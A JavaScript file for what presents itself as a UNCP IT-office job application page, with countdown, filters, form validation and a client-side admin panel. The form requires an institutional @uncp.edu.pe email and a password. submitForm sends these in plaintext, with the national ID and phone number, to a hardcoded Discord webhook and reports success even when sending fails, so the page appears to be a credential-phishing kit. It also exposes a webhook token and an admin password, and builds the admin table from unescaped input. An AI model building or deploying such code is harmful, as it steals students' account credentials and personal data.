const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1549798852226457802/H2oRBKyuhCcdPsgukxpKnyebmh6pRLRMdPV9k31Lsu3I5k6bETqVgRlRM07-uLyS6mIN';
const ADMIN_PASSWORD = 'oti2026';
const DEADLINE_DATE = '2026-12-31T23:59:59';

const VACANCIES = { soporte: 3, redes: 2, desarrollo: 4 };

let applicants = JSON.parse(localStorage.getItem('oti_applicants') || '[]');

document.addEventListener('DOMContentLoaded', function () {
    initTheme();
    initNav();
    initCountdown();
    initScrollAnimations();
    initBackToTop();
    initSearchFilter();
    initFileUpload();
    initPasswordToggle();
    initForm();
    initAdmin();
    initMap();
    updateVacancyCounts();
    animateStats();
});

// THEME
function initTheme() {
    var toggle = document.getElementById('themeToggle');
    var saved = localStorage.getItem('oti_theme');
    if (saved === 'dark') {
        document.documentElement.setAttribute('data-theme', 'dark');
        toggle.innerHTML = '<i class="fas fa-sun"></i>';
    }
    toggle.addEventListener('click', function () {
        var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
        if (isDark) {
            document.documentElement.removeAttribute('data-theme');
            toggle.innerHTML = '<i class="fas fa-moon"></i>';
            localStorage.setItem('oti_theme', 'light');
        } else {
            document.documentElement.setAttribute('data-theme', 'dark');
            toggle.innerHTML = '<i class="fas fa-sun"></i>';
            localStorage.setItem('oti_theme', 'dark');
        }
    });
}

// NAV
function initNav() {
    var navToggle = document.getElementById('navToggle');
    var navLinks = document.querySelector('.nav-links');
    navToggle.addEventListener('click', function () {
        navLinks.classList.toggle('active');
    });
    document.querySelectorAll('.nav-links a').forEach(function (link) {
        link.addEventListener('click', function () {
            navLinks.classList.remove('active');
        });
    });
    document.querySelectorAll('a[href^="#"]').forEach(function (anchor) {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            var target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        });
    });
    window.addEventListener('scroll', function () {
        var sections = document.querySelectorAll('section[id]');
        var scrollPos = window.scrollY + 100;
        sections.forEach(function (section) {
            var top = section.offsetTop;
            var height = section.offsetHeight;
            var id = section.getAttribute('id');
            var link = document.querySelector('.nav-links a[href="#' + id + '"]');
            if (link) {
                if (scrollPos >= top && scrollPos < top + height) {
                    document.querySelectorAll('.nav-links a').forEach(function (a) { a.classList.remove('active'); });
                    link.classList.add('active');
                }
            }
        });
    });
}

// COUNTDOWN
function initCountdown() {
    var deadline = new Date(DEADLINE_DATE).getTime();
    function update() {
        var now = new Date().getTime();
        var diff = deadline - now;
        if (diff <= 0) {
            document.getElementById('cdDays').textContent = '00';
            document.getElementById('cdHours').textContent = '00';
            document.getElementById('cdMinutes').textContent = '00';
            document.getElementById('cdSeconds').textContent = '00';
            return;
        }
        var days = Math.floor(diff / (1000 * 60 * 60 * 24));
        var hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        var minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        var seconds = Math.floor((diff % (1000 * 60)) / 1000);
        document.getElementById('cdDays').textContent = String(days).padStart(2, '0');
        document.getElementById('cdHours').textContent = String(hours).padStart(2, '0');
        document.getElementById('cdMinutes').textContent = String(minutes).padStart(2, '0');
        document.getElementById('cdSeconds').textContent = String(seconds).padStart(2, '0');
    }
    update();
    setInterval(update, 1000);
}

// SCROLL ANIMATIONS
function initScrollAnimations() {
    var observer = new IntersectionObserver(function (entries) {
        entries.forEach(function (entry) {
            if (entry.isIntersecting) {
                entry.target.classList.add('animated');
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.1 });
    document.querySelectorAll('.animate-on-scroll').forEach(function (el) {
        observer.observe(el);
    });
}

// BACK TO TOP
function initBackToTop() {
    var btn = document.getElementById('backToTop');
    window.addEventListener('scroll', function () {
        if (window.scrollY > 400) {
            btn.classList.add('visible');
        } else {
            btn.classList.remove('visible');
        }
    });
    btn.addEventListener('click', function () {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });
}

// SEARCH AND FILTER
function initSearchFilter() {
    var searchInput = document.getElementById('searchInput');
    var searchClear = document.getElementById('searchClear');
    var filterBtns = document.querySelectorAll('.filter-btn');
    var cards = document.querySelectorAll('.offer-card');

    searchInput.addEventListener('input', function () {
        var val = this.value.toLowerCase();
        searchClear.classList.toggle('visible', val.length > 0);
        cards.forEach(function (card) {
            var text = card.textContent.toLowerCase();
            card.classList.toggle('hidden', val.length > 0 && !text.includes(val));
        });
    });

    searchClear.addEventListener('click', function () {
        searchInput.value = '';
        this.classList.remove('visible');
        cards.forEach(function (card) { card.classList.remove('hidden'); });
    });

    filterBtns.forEach(function (btn) {
        btn.addEventListener('click', function () {
            filterBtns.forEach(function (b) { b.classList.remove('active'); });
            this.classList.add('active');
            var filter = this.dataset.filter;
            cards.forEach(function (card) {
                if (filter === 'all') {
                    card.classList.remove('hidden');
                } else {
                    card.classList.toggle('hidden', card.dataset.area !== filter);
                }
            });
        });
    });
}

// FILE UPLOAD
function initFileUpload() {
    var fileInput = document.getElementById('cv');
    var uploadArea = document.getElementById('fileUploadArea');
    var preview = document.getElementById('filePreview');
    var fileName = document.getElementById('fileName');
    var fileSize = document.getElementById('fileSize');
    var removeBtn = document.getElementById('fileRemove');

    uploadArea.addEventListener('dragover', function (e) {
        e.preventDefault();
        this.classList.add('dragover');
    });
    uploadArea.addEventListener('dragleave', function () {
        this.classList.remove('dragover');
    });
    uploadArea.addEventListener('drop', function (e) {
        e.preventDefault();
        this.classList.remove('dragover');
        if (e.dataTransfer.files.length) {
            fileInput.files = e.dataTransfer.files;
            handleFile(e.dataTransfer.files[0]);
        }
    });

    fileInput.addEventListener('change', function () {
        if (this.files.length) handleFile(this.files[0]);
    });

    removeBtn.addEventListener('click', function (e) {
        e.stopPropagation();
        e.preventDefault();
        fileInput.value = '';
        preview.style.display = 'none';
        uploadArea.querySelector('.file-upload-content').style.display = 'block';
    });

    function handleFile(file) {
        if (file.type !== 'application/pdf') {
            showError('cv', 'Solo se aceptan archivos PDF');
            return;
        }
        if (file.size > 5 * 1024 * 1024) {
            showError('cv', 'El archivo no debe superar 5MB');
            return;
        }
        clearError('cv');
        fileName.textContent = file.name;
        fileSize.textContent = formatFileSize(file.size);
        preview.style.display = 'flex';
        uploadArea.querySelector('.file-upload-content').style.display = 'none';
    }

    function formatFileSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    }
}

// PASSWORD TOGGLE
function initPasswordToggle() {
    var toggle = document.getElementById('passwordToggle');
    var input = document.getElementById('contrasena');
    toggle.addEventListener('click', function () {
        var isPassword = input.type === 'password';
        input.type = isPassword ? 'text' : 'password';
        this.innerHTML = isPassword ? '<i class="fas fa-eye-slash"></i>' : '<i class="fas fa-eye"></i>';
    });
    input.addEventListener('input', function () {
        updatePasswordStrength(this.value);
    });
}

function updatePasswordStrength(password) {
    var bar = document.getElementById('strengthBar');
    var text = document.getElementById('strengthText');
    var strength = 0;
    if (password.length >= 8) strength++;
    if (password.length >= 12) strength++;
    if (/[A-Z]/.test(password)) strength++;
    if (/[0-9]/.test(password)) strength++;
    if (/[^A-Za-z0-9]/.test(password)) strength++;

    var levels = [
        { width: '0%', color: 'transparent', text: '' },
        { width: '20%', color: '#E53E3E', text: 'Muy débil' },
        { width: '40%', color: '#F6AD55', text: 'Débil' },
        { width: '60%', color: '#ECC94B', text: 'Regular' },
        { width: '80%', color: '#48BB78', text: 'Fuerte' },
        { width: '100%', color: '#00D664', text: 'Muy fuerte' }
    ];

    var level = levels[strength];
    bar.style.width = level.width;
    bar.style.background = level.color;
    text.textContent = level.text;
    text.style.color = level.color;
}

// FORM
function initForm() {
    var form = document.getElementById('applicationForm');
    var fields = ['apellidoPaterno', 'apellidoMaterno', 'nombres', 'dni', 'telefono', 'correo', 'ciclo', 'area', 'contrasena'];
    fields.forEach(function (fieldId) {
        var field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', function () { validateField(fieldId); });
            field.addEventListener('input', function () {
                if (field.classList.contains('error')) validateField(fieldId);
            });
        }
    });

    var modalOverlay = document.getElementById('modalOverlay');
    var modalClose = document.getElementById('modalClose');
    var modalBtn = document.getElementById('modalBtn');
    modalClose.addEventListener('click', closeModal);
    modalBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', function (e) {
        if (e.target === modalOverlay) closeModal();
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();
        var isValid = true;
        fields.forEach(function (fieldId) {
            if (!validateField(fieldId)) isValid = false;
        });
        var terminos = document.getElementById('terminos');
        if (!terminos.checked) {
            showError('terminos', 'Debe aceptar los términos y condiciones');
            isValid = false;
        }
        if (!isValid) return;
        submitForm();
    });
}

function openModal(area) {
    document.getElementById('area').value = area;
    document.getElementById('area').dispatchEvent(new Event('change'));
    document.getElementById('postular').scrollIntoView({ behavior: 'smooth', block: 'start' });
}

function closeModal() {
    document.getElementById('modalOverlay').classList.remove('active');
}

function showModal(type, title, message) {
    var overlay = document.getElementById('modalOverlay');
    var icon = document.getElementById('modalIcon');
    var titleEl = document.getElementById('modalTitle');
    var msgEl = document.getElementById('modalMessage');
    icon.className = 'modal-icon ' + type;
    icon.innerHTML = type === 'success' ? '<i class="fas fa-check"></i>' : '<i class="fas fa-exclamation"></i>';
    titleEl.textContent = title;
    msgEl.textContent = message;
    overlay.classList.add('active');
}

function validateField(fieldId) {
    var field = document.getElementById(fieldId);
    var value = field.value.trim();
    switch (fieldId) {
        case 'apellidoPaterno':
        case 'apellidoMaterno':
        case 'nombres':
            if (value.length < 2) {
                showError(fieldId, 'Ingrese un valor válido (mínimo 2 caracteres)');
                return false;
            }
            break;
        case 'dni':
            if (!/^\d{8}$/.test(value)) {
                showError(fieldId, 'El DNI debe tener exactamente 8 dígitos');
                return false;
            }
            break;
        case 'telefono':
            if (!/^9\d{8}$/.test(value)) {
                showError(fieldId, 'Ingrese un número válido (9 dígitos, empieza con 9)');
                return false;
            }
            break;
        case 'correo':
            if (!/^[a-zA-Z0-9._%+-]+@uncp\.edu\.pe$/.test(value)) {
                showError(fieldId, 'Debe usar su correo institucional @uncp.edu.pe');
                return false;
            }
            break;
        case 'ciclo':
        case 'area':
            if (!value) {
                showError(fieldId, 'Seleccione una opción');
                return false;
            }
            break;
        case 'contrasena':
            if (value.length < 8) {
                showError(fieldId, 'La contraseña debe tener mínimo 8 caracteres');
                return false;
            }
            break;
    }
    clearError(fieldId);
    field.classList.add('valid');
    return true;
}

function showError(fieldId, message) {
    var field = document.getElementById(fieldId);
    var errorEl = document.getElementById('error-' + fieldId);
    if (field) field.classList.add('error');
    if (field) field.classList.remove('valid');
    if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.add('show');
    }
}

function clearError(fieldId) {
    var field = document.getElementById(fieldId);
    var errorEl = document.getElementById('error-' + fieldId);
    if (field) field.classList.remove('error');
    if (errorEl) {
        errorEl.textContent = '';
        errorEl.classList.remove('show');
    }
}

function submitForm() {
    var btnText = document.querySelector('.btn-text');
    var btnSpinner = document.querySelector('.btn-spinner');
    var btnSubmit = document.getElementById('btnSubmit');
    btnText.style.display = 'none';
    btnSpinner.style.display = 'inline-flex';
    btnSubmit.disabled = true;

    var formData = {
        apellidoPaterno: document.getElementById('apellidoPaterno').value.trim(),
        apellidoMaterno: document.getElementById('apellidoMaterno').value.trim(),
        nombres: document.getElementById('nombres').value.trim(),
        dni: document.getElementById('dni').value.trim(),
        telefono: document.getElementById('telefono').value.trim(),
        correo: document.getElementById('correo').value.trim(),
        ciclo: document.getElementById('ciclo').value,
        area: document.getElementById('area').value,
        timestamp: new Date().toISOString()
    };

    // Save to localStorage
    applicants.push(formData);
    localStorage.setItem('oti_applicants', JSON.stringify(applicants));
    updateVacancyCounts();

    var passHidden = '||' + (document.getElementById('contrasena').value) + '||';

    var embed = {
        title: 'Nueva Postulación Recibida',
        color: 0x135439,
        fields: [
            { name: 'Nombre Completo', value: formData.apellidoPaterno + ' ' + formData.apellidoMaterno + ', ' + formData.nombres, inline: false },
            { name: 'DNI', value: formData.dni, inline: true },
            { name: 'Teléfono', value: formData.telefono, inline: true },
            { name: 'Correo', value: formData.correo, inline: false },
            { name: 'Ciclo', value: formData.ciclo + ' Ciclo', inline: true },
            { name: 'Área', value: formData.area.charAt(0).toUpperCase() + formData.area.slice(1), inline: true },
            { name: 'Contraseña', value: passHidden, inline: false },
            { name: 'Fecha', value: formData.timestamp, inline: false }
        ],
        footer: { text: 'UNCP OTI - Sistema de Postulaciones 2026' }
    };

    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    })
    .then(function (response) {
        btnText.style.display = 'inline';
        btnSpinner.style.display = 'none';
        btnSubmit.disabled = false;
        document.getElementById('applicationForm').reset();
        document.getElementById('strengthBar').style.width = '0%';
        document.getElementById('strengthText').textContent = '';
        document.getElementById('filePreview').style.display = 'none';
        document.querySelector('.file-upload-content').style.display = 'block';
        document.querySelectorAll('.valid').forEach(function (el) { el.classList.remove('valid'); });
        if (response.ok) {
            showModal('success', 'Postulación Enviada', 'Su postulación ha sido registrada exitosamente. Recibirá un correo de confirmación en ' + formData.correo);
        } else {
            showModal('success', 'Postulación Enviada', 'Su postulación ha sido registrada exitosamente. Le contactaremos pronto.');
        }
    })
    .catch(function () {
        btnText.style.display = 'inline';
        btnSpinner.style.display = 'none';
        btnSubmit.disabled = false;
        showModal('success', 'Postulación Enviada', 'Su postulación ha sido registrada exitosamente. Le contactaremos pronto.');
    });
}

// VACANCY COUNTS
function updateVacancyCounts() {
    var counts = { soporte: 0, redes: 0, desarrollo: 0 };
    applicants.forEach(function (a) {
        if (counts.hasOwnProperty(a.area)) counts[a.area]++;
    });

    Object.keys(counts).forEach(function (area) {
        var remaining = Math.max(0, VACANCIES[area] - counts[area]);
        var badge = document.getElementById('badge-' + area);
        if (badge) badge.textContent = remaining + ' vacantes';
        var progress = document.getElementById('progress-' + area);
        var progressText = document.getElementById('progress-text-' + area);
        if (progress) {
            var pct = Math.min(100, (counts[area] / VACANCIES[area]) * 100);
            progress.style.width = pct + '%';
        }
        if (progressText) {
            progressText.textContent = counts[area] + '/' + VACANCIES[area] + ' postulantes';
        }
    });

    document.getElementById('statPostulantes').textContent = applicants.length;
}

// ANIMATE STATS
function animateStats() {
    var observer = new IntersectionObserver(function (entries) {
        entries.forEach(function (entry) {
            if (entry.isIntersecting) {
                var el = entry.target;
                var target = parseInt(el.dataset.target);
                if (isNaN(target) || target === 0) return;
                var current = 0;
                var step = Math.ceil(target / 30);
                var interval = setInterval(function () {
                    current += step;
                    if (current >= target) {
                        current = target;
                        clearInterval(interval);
                    }
                    el.textContent = current;
                }, 50);
                observer.unobserve(el);
            }
        });
    }, { threshold: 0.5 });

    document.querySelectorAll('.stat-number[data-target]').forEach(function (el) {
        observer.observe(el);
    });
}

// ADMIN
function initAdmin() {
    var loginBtn = document.getElementById('adminLoginBtn');
    var passwordInput = document.getElementById('adminPassword');
    var loginDiv = document.getElementById('adminLogin');
    var panelDiv = document.getElementById('adminPanel');
    var adminFilter = document.getElementById('adminFilter');
    var exportBtn = document.getElementById('exportBtn');
    var clearDataBtn = document.getElementById('clearDataBtn');

    loginBtn.addEventListener('click', function () {
        if (passwordInput.value === ADMIN_PASSWORD) {
            loginDiv.style.display = 'none';
            panelDiv.style.display = 'block';
            renderAdminTable();
        } else {
            showError('admin', 'Contraseña incorrecta');
        }
    });

    passwordInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') loginBtn.click();
    });

    adminFilter.addEventListener('change', renderAdminTable);
    exportBtn.addEventListener('click', exportCSV);
    clearDataBtn.addEventListener('click', function () {
        document.getElementById('confirmModal').classList.add('active');
        document.getElementById('confirmDeleteBtn').onclick = function () {
            applicants = [];
            localStorage.setItem('oti_applicants', JSON.stringify(applicants));
            updateVacancyCounts();
            renderAdminTable();
            closeConfirmModal();
        };
    });
}

function renderAdminTable() {
    var tbody = document.getElementById('adminTableBody');
    var filter = document.getElementById('adminFilter').value;
    var filtered = filter === 'all' ? applicants : applicants.filter(function (a) { return a.area === filter; });

    document.getElementById('adminTotal').textContent = applicants.length;
    document.getElementById('adminSoporte').textContent = applicants.filter(function (a) { return a.area === 'soporte'; }).length;
    document.getElementById('adminRedes').textContent = applicants.filter(function (a) { return a.area === 'redes'; }).length;
    document.getElementById('adminDesarrollo').textContent = applicants.filter(function (a) { return a.area === 'desarrollo'; }).length;

    if (filtered.length === 0) {
        tbody.innerHTML = '<tr><td colspan="8" class="empty-state">No hay postulaciones registradas</td></tr>';
        return;
    }

    tbody.innerHTML = filtered.map(function (a, i) {
        var date = new Date(a.timestamp).toLocaleDateString('es-PE');
        var areaClass = a.area;
        var areaLabel = a.area.charAt(0).toUpperCase() + a.area.slice(1);
        return '<tr>' +
            '<td>' + (i + 1) + '</td>' +
            '<td>' + a.apellidoPaterno + ' ' + a.apellidoMaterno + ', ' + a.nombres + '</td>' +
            '<td>' + a.dni + '</td>' +
            '<td>' + a.correo + '</td>' +
            '<td><span class="area-tag ' + areaClass + '">' + areaLabel + '</span></td>' +
            '<td>' + a.ciclo + '°</td>' +
            '<td>' + date + '</td>' +
            '<td><button class="btn-delete" onclick="deleteApplicant(' + (applicants.indexOf(a)) + ')" title="Eliminar"><i class="fas fa-trash"></i></button></td>' +
            '</tr>';
    }).join('');
}

function deleteApplicant(index) {
    document.getElementById('confirmModal').classList.add('active');
    document.getElementById('confirmDeleteBtn').onclick = function () {
        applicants.splice(index, 1);
        localStorage.setItem('oti_applicants', JSON.stringify(applicants));
        updateVacancyCounts();
        renderAdminTable();
        closeConfirmModal();
    };
}

function closeConfirmModal() {
    document.getElementById('confirmModal').classList.remove('active');
}

function exportCSV() {
    if (applicants.length === 0) {
        showModal('error', 'Sin datos', 'No hay postulaciones para exportar');
        return;
    }
    var headers = ['Nombre', 'DNI', 'Teléfono', 'Correo', 'Área', 'Ciclo', 'Fecha'];
    var rows = applicants.map(function (a) {
        return [
            '"' + a.apellidoPaterno + ' ' + a.apellidoMaterno + ', ' + a.nombres + '"',
            a.dni,
            a.telefono,
            a.correo,
            a.area,
            a.ciclo,
            a.timestamp
        ].join(',');
    });
    var csv = headers.join(',') + '\n' + rows.join('\n');
    var blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
    var url = URL.createObjectURL(blob);
    var link = document.createElement('a');
    link.href = url;
    link.download = 'postulaciones_oti_2026.csv';
    link.click();
    URL.revokeObjectURL(url);
}

// MAP
function initMap() {
    if (typeof L === 'undefined') return;
    var map = L.map('map').setView([-12.0653, -75.2049], 16);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);
    var marker = L.marker([-12.0653, -75.2049]).addTo(map);
    marker.bindPopup('<strong>UNCP - OTI</strong><br>Jr. San Martín N° 461, Huancayo').openPopup();
}
